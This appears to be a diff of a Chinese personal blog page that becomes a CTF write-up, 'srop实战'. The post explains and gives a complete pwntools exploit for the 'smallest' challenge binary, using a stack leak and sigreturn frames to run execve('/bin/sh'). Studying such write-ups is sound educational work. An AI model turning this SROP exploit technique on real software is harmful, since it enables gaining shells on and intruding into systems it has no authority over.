@@ -45,7 +45,7 @@
     
     <title>
         
-            归档: 2017/12 | 
+            srop实战 | 
         
         穷则变，变则通，通则久
     </title>
@@ -57,7 +57,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="hac425">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="">
+    <meta name="keywords" content=",rop,srop">
 
     <!-- Import lsloader -->
     <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
@@ -239,15 +239,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://jinyu00.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="归档: 2017/12 | 穷则变，变则通，通则久">
+    <meta property="og:title" content="srop实战 | 穷则变，变则通，通则久">
     <meta property="og:image" content="http://jinyu00.github.io/img/girl.png" />
     <meta property="og:description" content="">
-    
+    <meta property="og:article:tag" content="rop"> <meta property="og:article:tag" content="srop"> 
 
+    
+        <meta property="article:published_time" content="Sat Dec 16 2017 17:36:00 GMT+0800" />
+        <meta property="article:modified_time" content="Sat Dec 16 2017 18:20:37 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="归档: 2017/12 | 穷则变，变则通，通则久">
+    <meta name="twitter:title" content="srop实战 | 穷则变，变则通，通则久">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="http://jinyu00.github.io/img/girl.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -255,13 +258,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://jinyu00.github.io/archives/2017/12/index.html" />
+        <link rel="canonical" href="http://jinyu00.github.io/2017/12/16/pwn_with_srop.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://jinyu00.github.io/2017/12/16/pwn_with_srop.html",
+    "headline": "srop实战",
+    "datePublished": "Sat Dec 16 2017 17:36:00 GMT+0800",
+    "dateModified": "Sat Dec 16 2017 18:20:37 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",rop,srop",
+    "description": "",
+}
+</script>
 
 
     
@@ -304,159 +337,304 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#最后"><span class="post-toc-number">3.</span> <span class="post-toc-text">最后</span></a></li></ol>
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/12/16/pwn_with_srop.html">srop实战</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            前言s...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/12/16/pwn_with_srop.html" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/girl.png" width="44px" height="44px" alt="hac425's avatar">
-            </div>
-            <div>
-                <strong>hac425</strong>
-                <span>12月 16, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/ctf/">ctf</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/12/16/syscall_to_rop.html">syscall to rop</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            前言h...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/12/16/syscall_to_rop.html" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/girl.png" width="44px" height="44px" alt="hac425's avatar">
-            </div>
-            <div>
-                <strong>hac425</strong>
-                <span>12月 16, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/ctf/">ctf</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                srop实战
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>12月 16, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACcElEQVR42u3aQY7jMAwEwPz/07svsKZJSYwRlE+BZxK5dDCJFj//fvr64OHh4eHh4eHhvYz3ia+nbz3dWa+S/LX5bHh4eHgjvD9etcv/qS6//v2nz/mz4eHh4U3y1i/oNeZxseWdZK382fDw8PDez1sD8vKwbsTx8PDwfolXfcVX2248PDy89/PysKB3RVHCd7MWPDw8vJiXP9z859HzPTw8PLyAVx5piregGuDmxeDiTBkeHh5ewMtfxE/I5E6zOW6NI+Dh4eHN8HYOq3aOxG4creHh4eHd5u230euINg9w8y0rFAY8PDy8a7w8AkiWqYYRvdGBQmHAw8PDO8rLG9lqC56PBfRCDTw8PLzv8pIikZSB3hhWssXrFfHw8PAmeb1WuDoQkG9cdQCrkLXg4eHhHeVVhwaqAwT5cdpOicLDw8Ob5zVb2OCwqjcikK+Oh4eHN8nrjVutY4Ve4dkZisXDw8P7Fm//OKo6ZJDHIs2hKzw8PLwLvDwk7RWPPCDOBwUKhQEPDw/vGm8n2O1tU14G8s3Fw8PDm+El8UG1DOQH/71CUg4j8PDw8MZ5eYObl4f9LY6GrvDw8PAu83Za5+pjJRvXC4jx8PDwJnn7QUDSQOeFpBpq4OHh4c3wqlf1JX62nES/g4eHh3eZd/ilfPRbh2fK8PDw8I7yqsVgZ/neaEJyPIaHh4c3z6se6u8Pp1aHDLaGrvDw8PBew6s25XlwnDzVgfM9PDw8vBHeukVev/oLQwDFmBgPDw9vnpeEEevyUI5cg+a72ljj4eHhzfB6DXEev55t0/8oNnh4eHiXeb934eHh4eHh4eHhveD6DxdyhpJt0Q59AAAAAElFTkSuQmCC">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/rop/">rop</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/srop/">srop</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=srop实战&url=http://jinyu00.github.io/2017/12/16/pwn_with_srop.html&pic=http://jinyu00.github.io/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=srop实战&url=http://jinyu00.github.io/2017/12/16/pwn_with_srop.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://jinyu00.github.io/2017/12/16/pwn_with_srop.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://jinyu00.github.io/2017/12/16/pwn_with_srop.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>srop</code> 的作用比较强，在条件允许的情况下，尽量使用它。题目来自于 <code>i春秋</code>的一个比赛。</p>
+<p>题目链接：<br><a href="https://gitee.com/hac425/blog_data/blob/master/smallest" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/smallest</a></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>程序非常的简单</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513417180656goqrxx0p.png?imageslim" alt="paste image"><br>使用 <code>syscall</code> 进行系统调用，往 <code>rsp</code> 读入数据，然后 <code>ret</code>, 直接就可以控制 <code>rip</code>. </p>
+<p>程序非常的小，除了 这里基本没有代码，但是我们有 <code>syscall</code> ，<code>srop</code>利用之。首先明确目标。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">execve(“/bin/sh”, 0, 0)</div></pre></td></tr></table></figure>
+<p><code>syscall</code> 的传参顺序为 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rdi,rsi,rdx,rcx,r8, r9</div></pre></td></tr></table></figure>
+<p>然后 <code>rax</code> 存放 系统调用号 以及 <code>syscall</code> 的返回值。<br>所以我们需要设置 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">rax=59</div><div class="line">rdi---&gt; /bin/sh</div><div class="line">rsi=0</div><div class="line">rdx=0</div></pre></td></tr></table></figure>
+<p>然后 <code>syscall</code>.就可以拿到 <code>shell</code> 了。</p>
+<p>使用 <code>srop</code> 我们可以控制所有的寄存器的值。<br>所以我们需要一个可写的地址在一次<code>srop</code>结束后设置为 <code>rsp</code>.</p>
+<p><strong>下面根据 <code>exp</code> 进行讲解</strong></p>
+<p>首先是通过栈中环境变量，泄露栈的地址，得到一个可写的地址，用于 <code>srop</code> 时设置 <code>rsp</code>.</p>
+<p>因为 <code>write</code> 的系统调用号 为 <code>1</code>,  而且 <code>stdout</code> 也为 <code>1</code>, 这样我们输入一个字符。然后通过 <code>rop</code> 跳到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov     rdi, rax        ; fd</div><div class="line">syscall</div></pre></td></tr></table></figure>
+<p>我们就能 调用 <code>write(1,rsi,rdx)</code>, 此时的 <code>rsi</code> 就是栈的地址，<code>rdx</code> 则为 <code>0x400</code>,我们就能 拿到 栈的地址。</p>
+<p>有一点需要注意的是，我们需要事先布置好栈数据，然后再次进入 <code>start</code>, 控制 <code>rax</code>.因为我们要控制的 <code>rax</code> 值小于 我们需要布置的数据的长度。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">again = 0x4000B0         #xor     rax, rax</div><div class="line">rdi_rsi_sys = 0x04000BB  # mov     rdi, rax</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += p64(rdi_rsi_sys)</div><div class="line">payload += p64(again)  # addr for after leak</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">log.info(&quot;set stack for call write(1,....)&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">p.send(&apos;\xbb&apos;)</div><div class="line">data = p.recv()</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">stack_addr = u64(data[0x10:0x18]) - 0x253</div><div class="line">log.info(hex(stack_addr))</div><div class="line"></div><div class="line">log.info(&quot;set rax=1, and ret to rdi_rsi_sys to call write(1,....)&quot;)</div></pre></td></tr></table></figure>
+<p>然后就是 <code>srop</code> 了。首先使用 <code>srop</code> 修改 <code>rsp</code>到 我们 一个刚刚泄露的地址.设置好 <code>/bin/sh</code>, 这么做的原因是，在一个确定地址处设置好 <code>/bin/sh</code>，用于后面 <code>getshell</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134185188140sj1uelb.png?imageslim" alt="paste image"></p>
+<p>然后又回到开头，设置 <code>SigreturnFrame</code>, 此时已经可以确定<code>/bin/sh</code> 的地址了。设置好 寄存器。<code>srop</code>之后，再次 <code>syscall</code> 执行<br><code>execve(“/bin/sh”, 0, 0)</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134185607335pktg6kj.png?imageslim" alt="paste image"></p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>很多东西调试一遍就清楚了。调试 <code>exp</code>, 写一点就调试一点。<code>srop</code> 时 ,栈顶开始为 <code>SigreturnFrame</code>.</p>
+<p>参考：</p>
+<p><a href="http://blog.csdn.net/qq_29343201/article/details/72627439" target="_blank" rel="external">http://blog.csdn.net/qq_29343201/article/details/72627439</a></p>
+<p>完整的 <code>exp</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from time import sleep</div><div class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line">p = process(&quot;./smallest&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># gdb.attach(p, &apos;&apos;&apos;</div><div class="line"># bp *0x004000BE </div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">again = 0x4000B0         #xor     rax, rax</div><div class="line">rdi_rsi_sys = 0x04000BB  # mov     rdi, rax</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += p64(rdi_rsi_sys)</div><div class="line">payload += p64(again)  # addr for after leak</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">log.info(&quot;set stack for call write(1,....)&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">p.send(&apos;\xbb&apos;)</div><div class="line">data = p.recv()</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">stack_addr = u64(data[0x10:0x18]) - 0x253</div><div class="line">log.info(hex(stack_addr))</div><div class="line"></div><div class="line">log.info(&quot;set rax=1, and ret to rdi_rsi_sys to call write(1,....)&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># pause()</div><div class="line"></div><div class="line"></div><div class="line"># swtch rsp ---&gt; to leak addr, for get /bin/sh addr</div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rsp = stack_addr # after sigretrun, rsp</div><div class="line">frame.rip = again    # ret to begin</div><div class="line">payload = p64(again)</div><div class="line">payload += &apos;d&apos; * 8</div><div class="line">payload += str(frame)</div><div class="line"></div><div class="line">sleep(0.2)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line"></div><div class="line">syscall_addr = 0x04000BE </div><div class="line"></div><div class="line">payload = p64(syscall_addr)</div><div class="line">payload += &apos;\x11&apos; * (15 - len(payload))</div><div class="line"></div><div class="line">pause()</div><div class="line">sleep(0.2)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">log.info(&quot;switch stack done&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += &quot;B&quot; * 8</div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rsp = stack_addr # after sigretrun, rsp</div><div class="line">frame.rip = syscall_addr    # ret to begin</div><div class="line"></div><div class="line">frame.rax = 59</div><div class="line"></div><div class="line">frame.rdi = stack_addr + 0x10 + 0xf8</div><div class="line"></div><div class="line">payload += str(frame)</div><div class="line">payload += &quot;/bin/sh\x00&quot;</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(syscall_addr)</div><div class="line">payload += &apos;\x11&apos; * (15 - len(payload))</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a>本站文章均原创， 转载注明来源</a>
+                        </strong>
+                        <br>
